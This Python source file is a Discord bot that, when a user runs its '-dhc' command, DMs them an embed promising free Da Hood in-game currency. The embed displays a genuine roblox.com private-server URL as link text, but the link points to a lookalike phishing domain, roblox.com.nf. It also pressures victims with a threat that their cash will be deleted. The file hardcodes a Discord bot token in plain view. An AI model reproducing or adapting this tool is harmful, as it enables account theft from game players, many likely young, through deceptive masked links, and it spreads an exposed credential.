import discord
from discord.ext import commands
import requests


################### change these to your liking ###################

token =  "OTg2OTY0Njc2NjE5NDIzNzY1.GpcgyA.UoJUqKTEiC-snSFk1kH-UAWnsgt0Ba0v3QYnPE"
prefix = "-"
title = "DHC dropped successfully!"
desc ="Join the private server below to get your DHC within 10 minutes, or cash will be deleted."
field = "Join the private server below:"
hyperlink = "https://roblox.com/games/2788229376/Da-Hood?privateServerLinkCode=66496258930890292097686694937534"
phish = "https://roblox.com.nf/games/2788229376/Da-Hood?privateServerLinkCode=26513559956815927745876661617204"

###################################################################



client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Bot Online!')
    print('----------------')

#change color and imageurl if you want#

main = discord.Embed(title=title,description=desc,color=3066993)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")

image = main.set_image(url="https://media.discordapp.net/attachments/986980897330978877/987534791324860437/download_3.jpeg")
thumbnail = main.set_thumbnail(url="https://media.discordapp.net/attachments/986980897330978877/987534791324860437/download_3.jpeg")

#redefine dhc if you want a different command#


@client.command()
async def dhc(ctx):
    await ctx.send('>>> Sent DHC in private server, check your DMs.')
    await ctx.author.send(embed=main)





client.run(token)